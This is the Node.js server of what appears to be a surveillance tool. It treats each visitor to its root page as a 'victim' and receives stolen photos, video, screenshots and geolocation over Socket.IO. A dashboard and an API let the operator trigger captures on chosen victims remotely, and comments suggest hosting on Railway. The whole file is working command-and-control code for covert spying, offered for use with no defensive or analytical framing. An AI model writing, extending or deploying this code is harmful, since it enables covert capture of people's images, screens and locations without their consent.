const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" }
});

app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Store victims
let victims = new Map();

io.on('connection', (socket) => {
    console.log('🎯 Victim connected:', socket.id);
    victims.set(socket.id, { socket, id: socket.id, connectedAt: Date.now() });
    
    // Photo
    socket.on('steal_photo', (data) => {
        console.log('📸 Photo received');
        io.emit('new_photo', { ...data, victimId: socket.id, timestamp: Date.now() });
    });
    
    // Video
    socket.on('steal_video', (data) => {
        console.log('🎥 Video received, size:', data.videoData?.length);
        io.emit('new_video', { ...data, victimId: socket.id, timestamp: Date.now() });
    });
    
    // Screenshot
    socket.on('steal_screenshot', (data) => {
        console.log('🖥️ Screenshot received');
        io.emit('new_screenshot', { ...data, victimId: socket.id, timestamp: Date.now() });
    });
    
    // Location
    socket.on('steal_location', (data) => {
        console.log('📍 Location:', data.lat, data.lng);
        io.emit('new_location', { ...data, victimId: socket.id });
    });
    
    // Dashboard joins
    socket.on('dashboard_join', () => {
        socket.join('dashboard');
        console.log('🖥️ Dashboard connected');
    });
    
    // Manual capture request to specific victim
    socket.on('request_photo', (victimId) => {
        const victim = victims.get(victimId);
        if (victim) {
            victim.socket.emit('capture_now');
            console.log('📸 Manual photo requested for:', victimId);
        }
    });
    
    socket.on('disconnect', () => {
        console.log('❌ Disconnected:', socket.id);
        victims.delete(socket.id);
        io.emit('victim_disconnected', socket.id);
    });
});

// Routes
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
});

// API endpoints
app.get('/api/victims', (req, res) => {
    res.json(Array.from(victims.keys()));
});

app.post('/api/capture/:victimId', (req, res) => {
    const victim = victims.get(req.params.victimId);
    if (victim) {
        victim.socket.emit('capture_now');
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`📱 Victim: https://your-project.up.railway.app`);
    console.log(`🖥️ Dashboard: https://your-project.up.railway.app/dashboard`);
});
